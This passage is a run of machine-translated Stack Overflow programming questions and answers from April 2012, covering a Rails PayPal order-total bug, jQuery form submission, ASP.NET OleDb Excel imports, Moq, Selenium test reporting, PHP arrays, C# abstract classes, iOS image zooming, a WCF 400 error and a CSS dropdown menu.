SQL (0.5ms)  INSERT INTO `order_transactions` (`action`, `amount`, `authorization`, `created_at`, `message`, `order_id`, `params`, `success`, `updated_at`) VALUES ('purchase', 1, '0GT41652PP785722H', '2012-04-18 21:35:46', 'Success', 5, '--- \nbuild: \"2764190\"\nAck: Success\ntimestamp: \"2012-04-18T21:35:45Z\"\nTransactionID: 0GT41652PP785722H\namount: \"42.00\"\namount_currency_id: USD\ntransaction_id: 0GT41652PP785722H\nack: Success\nBuild: \"2764190\"\navs_code: X\nversion: \"62.0\"\nTimestamp: \"2012-04-18T21:35:45Z\"\nCorrelationID: 690aa904db3c\nAmount: \"42.00\"\nAVSCode: X\nVersion: \"62.0\"\ncvv2_code: M\nCVV2Code: M\ncorrelation_id: 690aa904db3c\n', 1, '2012-04-18 21:35:46') 
```

关于如何创建订单的一些细节：

**订单控制器.rb**

```
 def create
    @order = current_cart.build_order(params[:order])
    @order.user_id = current_user.id
    @order.total = current_cart.total_price
#    raise current_cart.total_price.inspect
    @order.line_items = current_cart.line_items
    @order.ip_address = request.remote_ip
    if @order.save
      if @order.purchase
        Cart.destroy(session[:cart_id])
        session[:cart_id] = nil
      else
        render :action => "failure"
      end
        respond_to do |format|
          format.html { redirect_to products_path, :notice => 
          'Thank you for your order.' }
          format.json { render :json => @order }
        end
    else
       render :action => 'new'
    end
  end 
```

**请注意**，如果我在控制器中激活提升检查线，我会得到

`#<Money cents:4200 currency:USD>` 错误，在这种情况下，4200 是 2 个选定产品的 total_price。42.00 美元。这是应用程序需要将其存储在数据库中时，total_price 公式可以正常工作的又一证据。

**总价：**

`total_price`在**cart.rb**和**line_item.rb中形成**

**line_item.rb**

```
 belongs_to :order
  belongs_to :product
  belongs_to :cart
  belongs_to :user

  def total_price
    product.price * quantity
  end 
```

**购物车.rb**

```
has_many :line_items#, :dependent => :destroy
  has_one :order

  def to_s
    id
  end

  def add_product(product_id)
    current_item = line_items.find_by_product_id(product_id)
    if current_item
      current_item.quantity += 1
    else
      current_item = line_items.build(:product_id => product_id)
    end
    current_item
  end

  def total_price
    line_items.to_a.sum { |item| item.total_price }
  end 
```

**编辑**

数据库中的`order.total`字段类型现在是整数（11），但我尝试使用小数（10,0）以美分存储价格，但无论如何它都不起作用，我总是得到 1 美元的总价。价格为`products`十进制（10,0）。

非常**感谢您**的帮助.. 可能对未来的开发人员有用。

您可能需要的任何其他信息，请告诉我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T11:58:34.630

好吧，我将`order.total`from字段更改`decimal`为`float`type ，现在可以正常工作了。我有正确的金额发送到贝宝，以及为用户创建的订单中的正确金额。在使用之前，`money gem`它与`decimal`字段类型配合良好。**

# javascript - 仅使用 jquery 发送特定对象以形成

> ID：10218671
> 
> 赞同：-2
> 
> 时间：2012-04-18T21:58:27.403
> 
> 标签：javascript, jquery, forms

这个问题与[Jquery-Send only some value from a form](https://stackoverflow.com/questions/3746478/jquery-send-only-some-value-from-a-form)密切相关。我有一个表格：

```
<form accept-charset="UTF-8" action="/filter" data-remote="true" method="get">
  <div>
  <div>
    <h2 class="sort">Sort</h2>
    <select class="checkable" id="sort" name="sort">
         <option value='v'>Rank</option>
         <option value='n'>Alphabetical</option>
    </select>
  </div>
  <div>
    <h2 class="tag">Categories</h2>
    <ul>
      <li>
        <input name="category[a]" type="hidden" value="0" />
        <input class="checkable" id="category_a" name="category[a]" type="checkbox" value="1" />
        <span>a</span>
      </li>
      <li>
        <input name="category[adfsadf  fasdf]" type="hidden" value="0" />
        <input class="checkable" id="category_adfsadf  fasdf" name="category[adfsadf  fasdf]" type="checkbox" value="1" />
        <span>adfsadf  fasdf</span>
      </li>
      <li>
        <input name="category[another]" type="hidden" value="0" />
        <input class="checkable" id="category_another" name="category[another]" type="checkbox" value="1" />
        <span>another</span>
      </li>
      <li>
        <input name="category[another tag]" type="hidden" value="0" />
        <input class="checkable" id="category_another tag" name="category[another tag]" type="checkbox" value="1" />
        <span>another tag</span>
      </li>
    </ul>
  </div>
</form> 
```

我只想通过 ajax 发送检查的类别。这是我目前必须从表单中发送所有内容：

```
 $('.checkable').live('change',
   function() {
     $(this).parents('form:first').submit();
 }); 
```

这很好用，但是当类别数量非常多时，请求会不必要地长。我不知道如何为此编写提交功能。或者也许另一种方法更好？提前致谢！

- - - 解决方案 - - -

改用ajax路由

```
$('.checkable').live('change',
function() {

var dataString = 'sort='+ $('#sort').val();
$('input[type=checkbox]').each(function () {
    if($(this).is(":checked")) {
      dataString += '&'+$(this).prop('name')+'=1';
    }
});
alert
$.ajax({  
  type: "GET",  
  url: "/filter",  
  data: dataString,  
  success: function() {  
  }  
}); 
```

});

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T22:18:39.187

查看此链接，而不是提交整个表单，只需执行 ajax 发布，并且仅包含您要发送的表单元素。 [http://net.tutsplus.com/tutorials/javascript-ajax/submit-a-form-without-page-refresh-using-jquery/](http://net.tutsplus.com/tutorials/javascript-ajax/submit-a-form-without-page-refresh-using-jquery/)

这是一个示例帖子，您可以轻松地使用选中的选择器仅发送选中的输入

```
var dataString = 'name='+ name + '&email=' + email + '&phone=' + phone;  
//alert (dataString);return false;  
$.ajax({  
  type: "POST",  
  url: "bin/process.php",  
  data: dataString,  
  success: function() {  
    $('#contact_form').html("<div id='message'></div>");  
    $('#message').html("<h2>Contact Form Submitted!</h2>")  
    .append("<p>We will be in touch soon.</p>")  
    .hide()  
    .fadeIn(1500, function() {  
      $('#message').append("<img id='checkmark' src='images/check.png' />");  
    });  
  }  
});  
return false; 
```

# asp.net - 通过 OleDb 打开 XLSX 文件在 WinForms 中工作，但并不总是通过 ASP.Net

> ID：10218674
> 
> 赞同：0
> 
> 时间：2012-04-18T21:58:41.800
> 
> 标签：asp.net, vb.net, excel-2007

*（自答，定时器允许时接受）*

我已经构建了一个简单的库来从 XLS/XLSX 文件中导入数据。该代码在我的 WinForms 应用程序中完美运行，但当我从 ASP.Net 运行它时偶尔会引发异常。“偶尔”部分似乎基于文件大小。我的测试文件大约有 16,000 行和 18 列，作为一个 XLSX 文件，总大小约为 4MB。如果我删除行（减少到大约 12,000 行）它可以工作***，或者***如果我删除列（减少到大约 12）它可以工作***，或者***这些（14,000x14 等）的某些组合它可以工作。这让我相信我可能在某个地方遇到了内存限制。以下是不起作用的蒸馏代码：

```
Dim dsn = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=""c:\test.xlsx"";Extended Properties=Excel 12.0"
Using Con As New System.Data.OleDb.OleDbConnection(dsn)
    Con.Open()'Exception thrown here
    Con.Close()
End Using 
```

我得到的例外是：

> 外部表不是预期的格式

搜索这一切都在谈论如何让 DSN 正确，因为它可以在桌面上运行，所以我知道我做对了。

我的测试机器是 Windows 7 64 位，安装了[Microsoft Access Database Engine 2010 Redistributable - 32 位](http://www.microsoft.com/download/en/details.aspx?displaylang=en&id=13255)。（我的机器安装了 Office 2010 32 位，这就是我安装 32 位 ADE 的原因，它不允许您安装 64 位。）我已将 IIS 应用程序池设置为允许我需要的 32 位应用程序让ADE首先工作。我正在运行 v4 框架，据我所知，我的 IIS 设置非常标准。

就像我说的那样，每次我通过 WinForms 应用程序运行代码时，代码都能正常工作，但偶尔会在同一台机器上通过 ASP.net 失败。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T23:21:27.017

`mode`好吧，我终于通过向DSN添加一些属性让它在我的机器上运行：

```
Dim dsn = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=""c:\test.xlsx"";Extended Properties=Excel 12.0;Mode=Share Deny Write;" 
```

# vb.net - 无法使用模拟运行此单元测试

> ID：10218678
> 
> 赞同：1
> 
> 时间：2012-04-18T21:59:11.657
> 
> 标签：vb.net, unit-testing, mocking, moq

我试图对这个方法进行单元测试，这非常简单，只需将一个对象添加到数据库中，如果它运行良好，则返回 true

```
Public Shared Function CrearCliente(ByVal cliente As Cliente) As Boolean
    Try
        db.Cliente.Add(cliente)
        db.SaveChanges()
        Return True
    Catch ex As Exception
        Throw New Exception("ocurrio un error guardando al cliente")
    End Try
End Function 
```

现在这是我的测试

```
<TestMethod()>
Public Sub CrearClienteTest()
    Dim mock = New Moq.Mock(Of Cliente)
    Dim actual As Boolean
    mock.Setup(Function(x) x.Nombre).Returns("blah")
    'mock.Setup(Function(x) x.Apellido()
    actual = Class1.CrearCliente(mock.Object)
    Assert.AreEqual(True, actual)
End Sub 
```

很简单我的问题是为什么当调试时测试会抛出这个错误

```
Invalid setup on a non-virtual (overridable in VB) member: x => x.Nombre 
```

有什么问题？我需要其他配置吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T22:02:36.290

如错误所述，Moq 要求您模拟的成员是`Overridable`.

# python - Selenium+python 报告

> ID：10218679
> 
> 赞同：7
> 
> 时间：2012-04-18T21:59:18.727
> 
> 标签：python, selenium

我正在对 selenium+python 进行一些研发。我使用 selenium webdriver 和 unittest 模块在 python 中编写了一些测试用例。我想知道如何创建测试用例的报告。selenium 中是否有内置解决方案，或者我需要编写代码来生成文件。

或者在 python 中是否有任何其他具有 javascript 支持的 Web 测试框架具有报告功能。

我基本上是 python 和 selenium 的新手。只是试图探索。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-18T22:13:14.487

要开始在 Selenium+Python 之上构建测试报告，我将利用 python unittest 模块。[您将在此处](http://selenium-python.readthedocs.io/getting-started.html#using-selenium-to-write-tests)获得 Selenium 文档中的基本示例。

然后[HTMLTestRunner](http://tungwaiyip.info/software/HTMLTestRunner.html)模块结合 unittest 提供基本但健壮的 HTML 报告。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2018-01-29T09:14:07.160

使用 HTMLTestRunner

转到以下网址：

[http://tungwaiyip.info/software/HTMLTestRunner.html](http://tungwaiyip.info/software/HTMLTestRunner.html)

*   点击 HTMLTestRunner.py
*   复制所有代码
*   在您的项目中创建一个名为 HTMLTestRunner.py 的文件并转储代码
*   现在使用 import 关键字在脚本中导入该文件
*   在 main 方法中调用 HTMLTestRunner

示例代码：

```
from selenium import webdriver
import unittest
import HTMLTestRunner

class LoginTest(unittest.TestCase):

def setUp(self):

    print driverpath
    self.driver = webdriver.Chrome(driverpath + "chromedriver.exe")
    self.driver.get("http://google.com/")

def testPythonScript(self):
    driver=self.driver
    driver.maximize_window()
    driver.implicitly_wait(60)
    driver.get_screenshot_as_file(screenshotpath + "testPngFunction.png")
    driver.find_element_by_xpath("(//a[contains(@href,'contact-us')])[1]").click()
    driver.find_element_by_name("name").send_keys("shubham")
    driver.find_element_by_id("contactemail").send_keys("shubham.xyz@abc.com")
    driver.find_element_by_css_selector("#contact_form > div:nth-child(3) > div:nth-child(3) > input").send_keys(
        "389198318312")
    driver.find_element_by_name("company").send_keys("myname")
    driver.get_screenshot_as_file(screenshotpath + "ConatctUs.png")
    print driver.title
    assert "Hello" in driver.title
    print "execution ends"

def testPythonFailScript(self):
    driver=self.driver
    driver.find_element_by_name("notExist").send_keys("done")

    def tearDown(self):
        driver = self.driver
        driver.quit();

if __name__ == "__main__":
    HTMLTestRunner.main() 
```

现在打开终端并在命令下启动

```
python scriptFileName.py > TestReport.HTML 
```

注意：scriptFileName 是 python 文件名，TestReport 是 html 报告名。你可以随意命名

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-18T22:08:08.963

我的经验是，任何足够有用的测试框架最终都需要定制的日志记录解决方案。您最终将需要特定领域和上下文相关的信息，而预烘焙的解决方案由于被专门设计为通用且广泛适用，因此永远不会真正符合要求。如果您已经在使用 Python，我建议您查看该`logging`模块并学习如何编写处理程序和格式化程序。这实际上非常简单，与尝试将所需的日志记录硬塞到某个以硒为中心的模块中相比，您最终会得到更好的结果。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-18T22:20:23.427

考虑使用[机器人框架](http://www.robotframework.org)。它有一个 selenium 插件，并且机器人产生非常好的日志和报告。使用机器人，您不会直接在 python 中编写测试（不过，我想您可以）。相反，robot 是一个建立在 python 之上的基于关键字的测试系统。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-05-18T11:15:40.213

[Robot Framework](http://robotframework.org/)是一个功能测试框架，它的用户可以：

*   用易于理解的语言编写测试
*   组织为特定目的运行哪些测试
*   生成高级和详细的测试结果
    *   射频结果文件
    *   射频日志文件
    *   网页

![在此处输入图像描述](../Images/353efcde59aa1da136caabba8a9f9276.png)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-01-13T19:26:20.657

在我的特定应用程序中，我使用[Nose](https://pypi.python.org/pypi/nose/ "鼻子扩展了单元测试以使测试更容易") unittest 扩展来编写和运行测试套件。

最重要的是，我使用了一个[html 报告](https://pypi.python.org/pypi/nose-html-reporting)插件，它可以从我的测试周期中生成很好的报告。

# php - 在 PHP 中创建关联数组的数组

> ID：10218680
> 
> 赞同：12
> 
> 时间：2012-04-18T21:59:20.367
> 
> 标签：php, arrays, append, arrayofarrays

我想在 while 循环中创建一个关联数组的数组。在 while 循环的每次迭代中，我想在数组中添加一个新元素。我怎么能这样做？之后，我想在 foreach 中传递这个数组并打印数据。我现在有这部分代码，但显然有问题。

```
while($row2 = mysql_fetch_array($result))
{ 
    $myarray = array("id"=>$theid, "name"=>name($id), "text"=>$row2[text]);
                            } 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-04-18T22:02:12.490

要在数组末尾添加元素，请使用`[]`
示例：

```
$myarray[] = array("id"=>$theid, "name"=>name($id), "text"=>$row2[text]); 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-04-18T22:04:48.203

显然，好吧，先把它拆开，这样有一些东西要学：

```
while($row2 = mysql_fetch_array($result))
{
    ...
} 
```

这部分看起来还可以，我们来看看循环内部：

```
$myarray = array("id"=>$theid, "name"=>name($id), "text"=>$row2[text]); 
```

有多个点。可能最重要的是，因为它在循环内，所以您`$myarray`在每次迭代中都覆盖。您想改为添加到数组中。我们开工吧：

```
$myarray = array(); # initialize the array first!
while($row2 = mysql_fetch_array($result))
{
    $myarray[] = $row2; # add the row
} 
```

之后，您可以输出它以证明它基本上可以工作：

```
var_dump($myarray); 
```

这向您显示了一个包含所有行的数组。然后，您只需更改数据库查询，使其仅返回您感兴趣的字段。

如果您不能对数据库执行此操作，您也可以操作数组：

```
$myarray = array(); # initialize the array first!
while($row2 = mysql_fetch_array($result))
{
    $myarray[] = array(
        "id"   => $theid, 
        "name" => name($id), 
        "text" => $row2['text']
    );
}
var_dump($myarray); 
```

现在结果应该看起来像你想要的那样。输出`$myarray`：

```
foreach ($myarray as $number => $row)
{
    echo '<div>Number ', $number, ':<dl>';
    foreach ($row as $k => $v)
    {
        printf("<dt>%s</dt><dd>%s</dd>\n", $k, htmlspecialchars($v));
    }
    echo '</dl></div>'
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-18T22:03:56.160

如果您尝试在每次迭代中添加到 $myarray，请执行以下操作：

```
$myarray[] = array("id"=>$theid, "name"=>name($id), "text"=>$row2[text]); 
```

或像这样：

```
array_push($myarray, array("id"=>$theid, "name"=>name($id), "text"=>$row2[text])); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-18T22:01:49.243

显然你的访问`$row2`看起来是错误的，所以我认为这里是正确的

```
$myarray = array();
while($row2 = mysql_fetch_array($result)) { 
  // append something to your array with square brackets []
  $myarray[] = array("id"=> $row2['id'], "name" => $row2['name'], "text"=>$row2['text']);

  // or to maker this even shorter you could do
  $myarray[] = $row2; // ... because it has the same array key names
} 
```

然后当你想从中读取时：

```
foreach($myarray as $val) {
  echo $val['name'].' (ID: '.$val['id'].') wrote following text: '.$val['text'];
} 
```

# java - 如何在 Serializable 实现中序列化绝对最小数量的数据？

> ID：10218682
> 
> 赞同：0
> 
> 时间：2012-04-18T21:59:26.137
> 
> 标签：java, serialization, objectoutputstream, objectinputstream

我是新手`Java.io.Serializable`，所以如果这是一个全新的问题，我深表歉意。我想要做的是实现`readObject()`并且`writeObject()`使得绝对最小的数据被序列化。我基本上只想写一些原语，没有关于对象身份的信息，也没有关于对象图的信息，因为在我的应用程序中，当我反序列化这个对象时，我会知道所有这些信息。我希望这是有道理的！对于这个问题的高级性质，我深表歉意，因为我对此很陌生，可能在这里没有正确的词汇。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T22:00:08.550

您可以使用`transient`word 来声明字段，这样它们就不会被序列化。然后您不必自己实现 read/writeObject - 它只会序列化您想要序列化的内容。

更多信息在这里：[http ://www.javabeat.net/examples/2009/02/18/what-is-transient-keyword-in-java/](http://www.javabeat.net/examples/2009/02/18/what-is-transient-keyword-in-java/)

# c# - 无法调用抽象成员

> ID：10218686
> 
> 赞同：3
> 
> 时间：2012-04-18T21:59:47.443
> 
> 标签：c#

我在处理抽象类的 C# 中做作业。

```
public abstract class Account
{   
    public abstract bool Credit(double amount); 
    public abstract bool Debit(double amount);
}

public class SavingAccount : Account
{
    public override bool Credit(double amount)
    {
        bool temp = true;   
        temp = base.Credit(amount + calculateInterest());  
        return temp;  
    }

    public override bool Debit(double amount)
    {
        bool flag = true;    
        double temp = getBalance();    
        temp = temp - amount;

        if (temp < 10000)
        {
            flag = false;
        }

        else
        {
            return (base.Debit(amount));
        }

        return flag;
    }
} 
```

当我调用 base.Debit() 或 base.Credit() 时，它给了我无法调用抽象成员的错误。请帮我。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T22:11:41.420

您不能调用抽象方法，其想法是声明为抽象的方法只需要派生类来定义它。使用`base.Debit`会影响尝试调用抽象方法，这是无法完成的。更仔细地阅读你的代码，我认为这就是你想要的`Debit()`

```
public abstract class Account
{
  protected double _balance;

  public abstract bool Credit(double amount);
  public abstract bool Debit(double amount);
}

public class SavingAccount : Account
{
  public double MinimumBalance { get; set; }

  public override bool Debit(double amount)
  {
    if (amount < 0)
      return Credit(-amount);

    double temp = _balance;
    temp = temp - amount;

    if (temp < MinimumBalance)
    {
      return false;
    }
    else
    {
      _balance = temp;
      return true;
    }
  }

  public override bool Credit(double amount)
  {
    if (amount < 0)
      return Debit(-amount);

    _balance += amount;
    return true;
  }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-18T22:02:46.113

抽象意味着没有实现。您使用它来强制派生类提供自己的。因此，您不应该直接调用抽象方法。我建议阅读： http: [//msdn.microsoft.com/en-us/library/sf985hc5 (v=vs.80).aspx](http://msdn.microsoft.com/en-us/library/sf985hc5(v=vs.80).aspx)

# php - 编写自己的 javascript 并使用 Yii PHP 框架？

> ID：10218689
> 
> 赞同：-1
> 
> 时间：2012-04-18T21:59:54.653
> 
> 标签：php, javascript, yii

我正在关注一个新项目的 Yii PHP 框架，但是在经历了一些演示并检查了代码之后，我注意到所有的 javascript 都是通过 Yii 函数生成的。有没有办法覆盖这个？我真的希望能够为项目的各个部分编写自己的 javascript，特别是对于需要大量 javascript 的基于地图的搜索片段。这是可能的吗？是否值得将 Yii 用于我必须为项目的几个部分编写大量我自己的 javascript 的项目？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T22:05:29.957

虽然 Yii 有帮助程序为你生成一些 JavaScript 代码，但没有什么能阻止你在输出中包含你自己的代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T22:09:44.773

当然，如果您不能或不想使用内置小部件，您可以自己编写大量 Javascript；但很多时候，“编写自己的”可能会成为一个小部件的子类化，以便您可以扩展它，或者只是从头开始编写自己的小部件。根据我的经验，能够从您提供的更高级别的规范（即配置小部件）自动生成 Javascript 是非常可取的。

从你的问题来看，虽然似乎有一些自动 Javascript 的特定情况看起来很麻烦——你能不能更新一下细节？

# xcode - 为什么加载新着色器时 XCode 4.3.2 中会引发 SIGABRT 异常？

> ID：10218690
> 
> 赞同：0
> 
> 时间：2012-04-18T22:00:00.280
> 
> 标签：xcode, opengl, glsl, shader, cinder

我正在使用 Cinder (libcinder.org) 创建一个使用一些着色器的应用程序。

我使用完全相同的方法加载和工作现有着色器，但是当我添加两个新着色器时，它们在运行时抛出 SIGABRT 异常。

以下是资源定义的示例： #define RES_VERT CINDER_RESOURCE( ../resources/, vert.glsl, 804, GLSL ) #define RES_FRAG CINDER_RESOURCE( ../resources/, frag.glsl, 805, GLSL )

这是尝试构建抛出异常的着色器程序的行： shader = gl::GlslProg( loadResource(RES_VERT), loadResource(RES_FRAG) );

是的，这些文件包含在我的项目和我的构建路径捆绑设置中。

为什么我的资源定义不起作用？

已解决：这是由于着色器版本控制错误，请参阅评论。

# objective-c - 图像在 UIImageView 中显示模糊

> ID：10218698
> 
> 赞同：0
> 
> 时间：2012-04-18T22:00:32.090
> 
> 标签：objective-c, ios, cocoa-touch, image, uiimageview

我正在创建一个应用程序，用户可以在其中将他们的日程表加载到应用程序中，然后显示它。

当允许在加载前编辑图像时，它会完美显示：

![图 1](../Images/80d587c2806bfeeb934a8b528d75b4df.png)

一旦用户“选择”了图像，它就会以`UIImageView`模糊的形式出现：

![图 2](../Images/9d753510213412856eddabd54f17387f.png)

这里稍微放大：

![图 3](../Images/3c109aa6b4d7e431e72e70cc74b4249f.png)

我知道图像分辨率还可以，因为图像可以预先完美显示。 **我怎样才能阻止它变得模糊？**

我正在使用放大`UIImageView`.`UIScrollView`

这是我用来分配图像的代码。zoomscroll 是，`UIScrollView`而 myschedule 是`UIImageView`：

```
-(void) imagePickerController:(UIImagePickerController *)picker didFinishPickingMediaWithInfo:(NSDictionary *)info {
[self dismissModalViewControllerAnimated:YES];

//Obtaining saving path
NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
NSString *documentsDirectory = [paths objectAtIndex:0];
NSString *imagePath = [documentsDirectory stringByAppendingPathComponent:@"myschedule.png"];

//Extracting image from the picker and saving it
NSString *mediaType = [info objectForKey:UIImagePickerControllerMediaType];   
if ([mediaType isEqualToString:@"public.image"]){
    UIImage *editedImage = [info objectForKey:UIImagePickerControllerEditedImage];
    NSData *webData = UIImagePNGRepresentation(editedImage);
    [webData writeToFile:imagePath atomically:YES];

    myschedule.image = editedImage;

    [zoomscroll addSubview:myschedule];
    zoomscroll.contentSize = CGSizeMake(myschedule.frame.size.width , myschedule.frame.size.height);
    zoomscroll.minimumZoomScale = 1.0;
    zoomscroll.maximumZoomScale = 4.0;
}
} 
```

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T23:02:53.853

iOS 在缩放视图时不会重绘视图，它只是向上或向下缩放视图。底层实现基本上是一个带纹理的 OpenGL 多边形，这就是缩放如此之快的原因。以更高的分辨率重新生成纹理很慢，因此 iOS 不会这样做，除非您明确告诉它这样做。

有多种方法可以解决此问题。最简单的可能是将滚动视图的 contentSize 设置为图像的实际大小，然后最初缩小，这样用户就不会将图像的小版本放大到 400%（这会导致模糊），而是缩小从 25% 到 100%。像这样的东西：

```
myschedule.image = editedImage;
myschedule.frame = CGRectMake(0, 0, editedImage.size.width, editedImage.size.height);

[zoomscroll addSubview:myschedule];
zoomscroll.contentSize = editedImage.size;
zoomscroll.minimumZoomScale = 0.25;
zoomscroll.maximumZoomScale = 1.0;
zoomscroll.zoomScale = zoomscroll.minimumZoomScale; 
```

# javascript - 替换 为

> ID：10218699
> 
> 赞同：-2
> 
> 时间：2012-04-18T22:00:34.047
> 
> 标签：javascript, markup, w3c-validation

我正在寻找一个脚本来替换

```
<br> 
```

和

```
<br /> 
```

也在寻求改变

```
border=0 
```

进入

```
border="0" 
```

这样做可以让我通过 w3c 合规性吗？在此先感谢 - 戴夫

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T22:05:38.880

要回答你的问题，不，它不会。并不是说 javascript 不能替换和/或修复格式错误的标签，而是当你的脚本运行时，html 已经被解析了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T22:05:54.163

我不确定您在寻找什么，但如果您可以访问它们，我会在 HTML 文件中使用查找和替换这种更改。不要忘记在所有打开的文件或解决方案中选择替换选项。

您的更改不够复杂，无法使用正则表达式。每次都运行一个javascript脚本而不是修复一次是个坏主意。

# c# - 400 错误请求但找不到问题

> ID：10218700
> 
> 赞同：-1
> 
> 时间：2012-04-18T22:00:35.780
> 
> 标签：c#, wcf, web-services, rest, bad-request

我很难弄清楚为什么我在客户端的 POST 方法中收到了 400 个错误请求。我的其他 POST 方法适用于此服务和客户端。然而这个不工作？我希望一双新的眼睛可能会发现问题？

我的服务如下所示：

```
 [OperationContract]
    [WebInvoke(Method = "POST", BodyStyle = WebMessageBodyStyle.Bare, RequestFormat = WebMessageFormat.Xml, ResponseFormat = WebMessageFormat.Xml, UriTemplate = "/Message")]
    void AddMessage(Message message);
    //Post Method for Message

    [DataContract(Name = "Message")]
    public class Message
    {
    [DataMember(Name = "MessageID")]
    public string MessageID { get; set; }
    [DataMember(Name = "GroupMessage")]
    public string GroupMessage { get; set; }
    //DataContracts for Message

    [ServiceBehavior(InstanceContextMode = InstanceContextMode.Single)] 
    public class RawDataService : IReceiveData
    {
    List<Message> messages = new List<Message>();
    int eCount = 0;

    public void AddMessage(Message message)
    {
        message.MessageID = (++eCount).ToString();
        messages.Add(message);
    }
    // add message method, increment MessageID 
```

要发布的客户端代码在标记行上给出 400 错误请求：

```
 private void button15_Click(object sender, EventArgs e)
    {
        string uriMessage = "http://localhost:8000/Service/Message";
        StringBuilder sb1 = new StringBuilder();
        sb1.AppendLine("</Message>");
        sb1.AppendLine("<GroupMessage>" + this.textBox22.Text + "</GroupMessage>");
        sb1.AppendLine("</Message>");
        string GroupMessage = sb1.ToString();
        byte[] arr1 = Encoding.UTF8.GetBytes(GroupMessage);
        HttpWebRequest req1 = (HttpWebRequest)WebRequest.Create(uriMessage);
        req1.Method = "POST";
        req1.ContentType = "application/xml";
        req1.ContentLength = arr1.Length;
        Stream reqStrm1 = req1.GetRequestStream();
        reqStrm1.Write(arr1, 0, arr1.Length);
        reqStrm1.Close();
        HttpWebResponse resp1 = (HttpWebResponse)req1.GetResponse(); //400 bad request?
        MessageBox.Show(resp1.StatusDescription);
        reqStrm1.Close();
        resp1.Close();
    } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-18T22:11:37.863

这可能是它。

```
sb1.AppendLine("</Message>");
sb1.AppendLine("<GroupMessage>" + this.textBox22.Text + "</GroupMessage>");
sb1.AppendLine("</Message>"); 
```

开始的 Message 元素实际上是一个结束元素。

# css - 如何在此菜单中添加下拉菜单？

> ID：10218705
> 
> 赞同：0
> 
> 时间：2012-04-18T22:00:50.787
> 
> 标签：css, drop-down-menu

我有一个非常简单的菜单，我想添加一个下拉菜单。我需要做什么才能在此处向其中一项添加下拉菜单？

[http://www.cozinhatur.com/teste1/](http://www.cozinhatur.com/teste1/)

HTML

```
 <div class="menu">
  <div class="search">
    <form id="form1" name="form1" method="post" action="">
      <label><span>
        <input name="q" type="text" class="keywords" id="textfield" maxlength="50" value="Pesquisar..." />
        </span>
        <input name="b" type="image" src="images/search.gif" class="button" />
      </label>
    </form>
  </div>
  <ul>
    <li><a href="index.html" class="active">HOME</a></li>
    <li><a href="quemsomos.html">QUEM SOMOS</a></li>
    <li><a href="index.html">COZINHAS</a></li>
    <li><a href="#">DIVERSOS</a></li>
    <li><a href="index.html">PRODUTOS</a></li>
    <li><a href="contact.html">CONTACTOS</a></li>
  </ul>
  <div class="clr"></div>
</div> 
```

CSS

```
.menu
{
    background:#5d5d5d;
    margin:0 auto;
    padding:0;
    width:942px;
}

.menu ul
{
    border:0;
    float:left;
    list-style:none;
    margin:0;
    padding:0;
    text-align:left;
}

.menu ul li
{
    border:0;
    float:left;
    margin:0;
    padding:0 5px 0 0;
}

.menu ul li a
{
    color:#fff;
    float:left;
    font-family:Verdana, Helvetica, Arial, sans-serif;
    font-size:11px;
    margin:0;
    padding:15px;
    text-decoration:none;
}

.menu ul li a:hover
{
    background:#b57800;
}

.menu ul li a.active
{
    background:#1caedd;
}

.menu ul li ul,.menu ul li ul a
{
    font-family:Verdana, Helvetica, Arial, sans-serif;
    font-size:11px;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T00:23:27.933

从您的菜单中制作了一个简单的 CSS 下拉菜单。请参阅[**jsFiddle 演示**](http://jsfiddle.net/neo108/nFS3M/)。将鼠标悬停在第二个和第三个菜单项上以查看下拉菜单。

希望这将帮助您进一步构建以满足您的需求。

代码变了……

**HTML**

```
<div class="menu">
    <ul>
        <li><a href="index.html" class="active">HOME</a></li>
        <li><a href="quemsomos.html">QUEM SOMOS</a>
          <ul>
            <li><a href="">Item 1</a></li>
            <li><a href="">Item 2</a></li> 
            <li><a href="">Item 3</a></li> 
          </ul> 
        </li>
        <li><a href="index.html">COZINHAS</a>
         <ul>
            <li><a href="">Item 1</a></li>
            <li><a href="">Item 2</a></li> 
            <li><a href="">Item 3</a></li> 
          </ul> 
        </li>
        </li>
        <li><a href="#">DIVERSOS</a></li>
        <li><a href="index.html">PRODUTOS</a></li>
        <li><a href="contact.html">CONTACTOS</a></li>
     </ul>
</div> 
```

**CSS**

```
.menu {
    background:#5d5d5d;
    margin:0 auto;
    padding:0;
    width:942px;
}
ul {
    border:0;
    float:left;
    list-style:none;
    margin:0;
    padding:0;
    text-align:left;
}
ul li {
    display: block;
    position: relative;
    float: left;
    border:0;
    float:left;
    margin:0;
    padding:0 5px 0 0;
}
li ul { 
    display: none; 
}
ul li a {
    display: block;
    text-decoration: none;
    color: #ffffff;
    border-top: 1px solid #ffffff;
    padding: 5px 15px 5px 15px;
    background: #5d5d5d;
    margin: 0px;
    white-space: nowrap;
}
ul li a.active
{
    background:#1caedd;
}
ul li a:hover { 
    background: #b57800; 
}
